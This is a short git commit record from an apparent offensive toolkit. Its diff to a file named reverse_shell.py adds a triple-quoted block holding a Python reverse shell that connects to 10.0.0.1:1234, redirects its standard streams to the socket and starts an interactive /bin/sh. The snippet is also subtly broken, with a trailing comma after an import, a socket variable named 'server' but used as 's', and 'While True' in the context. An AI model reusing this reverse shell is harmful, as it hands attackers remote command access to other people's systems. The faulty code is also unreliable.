ee530eeeb8e7492cdf14ea75a69b3287bcb0ec2d
niearheaiora <aam73983@rcasd.com>
2017-03-26 09:44:24 -0400

    Added new modules.

--- modules/linux/reverse_shell.py
+++ modules/linux/reverse_shell.py
@@ -22,5 +22,16 @@ While True:
 	client.handler(target=handle_client,args=client,)
 
 	client.handler.start()
-	
 
+
+"""
+import socket,
+import subprocess
+import os
+
+server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+server.connect(("10.0.0.1",1234))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+process=subprocess.call(["/bin/sh","-i"]);
+"""
